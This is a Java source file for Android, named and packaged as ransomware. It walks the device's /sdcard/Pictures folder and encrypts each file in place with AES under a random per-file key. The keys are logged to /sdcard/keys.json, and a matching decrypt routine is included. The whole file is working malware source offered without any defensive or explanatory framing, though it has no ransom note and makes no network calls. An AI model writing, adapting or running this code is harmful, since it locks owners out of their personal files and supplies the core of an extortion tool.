package com.mason.ransomware;


import android.os.Build;

import androidx.annotation.RequiresApi;

import com.google.gson.Gson;

import org.json.JSONException;
import org.json.JSONObject;
import org.json.simple.parser.JSONParser;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;


public class Ransomware {
    public Ransomware(){

    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    public static void main(String[] args) {
        // Set up keys.json
        if (!new File("/sdcard/keys.json").exists()){
            // Create new empty file to store key.json in /sdcard
            String path = "/sdcard/keys.json";
            File jsonFile = new File(path);
            String testKey = path.replace("/", "_");
            String testVal = "ZZHHYYTTUUHHGGRR";
            JSONObject jsonObj = new JSONObject();

            try {
                jsonObj.put(testKey, testVal);
            } catch (JSONException e) {
                e.printStackTrace();
            }

            try {
                FileOutputStream fos = new FileOutputStream(jsonFile);
                fos.write(jsonObj.toString().getBytes());
                fos.close();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }

            // Walk through dir
            try (Stream<Path> walk = Files.walk(Paths.get("/sdcard/Pictures"))) {
                List<String> result = walk.filter(Files::isRegularFile)
                        .map(x -> x.toString()).collect(Collectors.toList());

                Ransomware ransomware = new Ransomware();
                for (String filePath : result){
                    ransomware.encrypt(filePath);
                }
            } catch (IOException e) {
                e.printStackTrace();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void encrypt(String path) throws Exception {
        String jsonKey = path.replace("/", "_");
        String key = getAlphaNumericString(16);

        File inFile = new File(path);
        File encryptedFile = new File(path);

//        Pair<String, String> keyValPair = new Pair<>(jsonKey, key);
        String keyValPair[] = {jsonKey, key};
        Gson gson = new Gson();

        FileReader reader = new FileReader("/sdcard/keys.json");

        Map<String, String> jsonToMap = gson.fromJson(reader, Map.class);
        jsonToMap.put(keyValPair[0], keyValPair[1]);

        FileWriter writer = new FileWriter("/sdcard/keys.json");
        gson.toJson(jsonToMap, writer);
        writer.close();
        reader.close();

        this.lock(Cipher.ENCRYPT_MODE, key, inFile, encryptedFile);
    }

    private void decrypt(String path) throws Exception {
        String jsonKey = path.replace("/", "_");

        JSONParser parser = new JSONParser();
        Object obj = parser.parse(new FileReader("/sdcard/keys.json"));
        org.json.simple.JSONObject jsonObject = (org.json.simple.JSONObject) obj;
        String key = (String) jsonObject.get(jsonKey);

        File encryptedFile = new File(path);
        File decryptedFile = new File(path);

        FileReader reader = new FileReader("/sdcard/keys.json");
        reader.close();

        this.lock(Cipher.DECRYPT_MODE, key, encryptedFile, decryptedFile);
    }

    private void lock(int cipherMode, String key, File inFile, File outFile) throws Exception {
        try {
            Key skey = new SecretKeySpec(key.getBytes(), "AES"); // Create secretkey
            Cipher cipher = Cipher.getInstance("AES");
            cipher.init(cipherMode, skey);

            // File input stream
            FileInputStream inStream = new FileInputStream(inFile);
            byte[] inBytes = new byte[(int) inFile.length()]; // Create a Byte array with length of file
            inStream.read(inBytes); // Parse byte array into input stream

            byte[] outBytes = cipher.doFinal(inBytes); // Apply the cipher(en/decrypt) the byte array

            // File output stream
            FileOutputStream outStream = new FileOutputStream(outFile);
            outStream.write(outBytes); // Parse the byte array into output stream

            inStream.close(); // Close IO stream for memory cost
            outStream.close(); // Close IO stream for memory cost
        } catch ( InvalidKeyException | BadPaddingException |
                NoSuchPaddingException | NoSuchAlgorithmException |
                IllegalBlockSizeException | IOException ex ) {
            throw new Exception("Error during encryption/decryption", ex);
        }
    }


    private String getAlphaNumericString(int n)
    {
        // length is bounded by 256 Character
        byte[] array = new byte[256];
        new Random().nextBytes(array);

        String randomString
                = new String(array, Charset.forName("UTF-8"));

        // Create a StringBuffer to store the result
        StringBuffer r = new StringBuffer();

        // remove all spacial char
        String  AlphaNumericString
                = randomString
                .replaceAll("[^A-Za-z0-9]", "");

        // Append first 20 alphanumeric characters
        // from the generated random String into the result
        for (int k = 0; k < AlphaNumericString.length(); k++) {

            if (Character.isLetter(AlphaNumericString.charAt(k))
                    && (n > 0)
                    || Character.isDigit(AlphaNumericString.charAt(k))
                    && (n > 0)) {

                r.append(AlphaNumericString.charAt(k));
                n--;
            }
        }

        // return the resultant string
        return r.toString();
    }
}
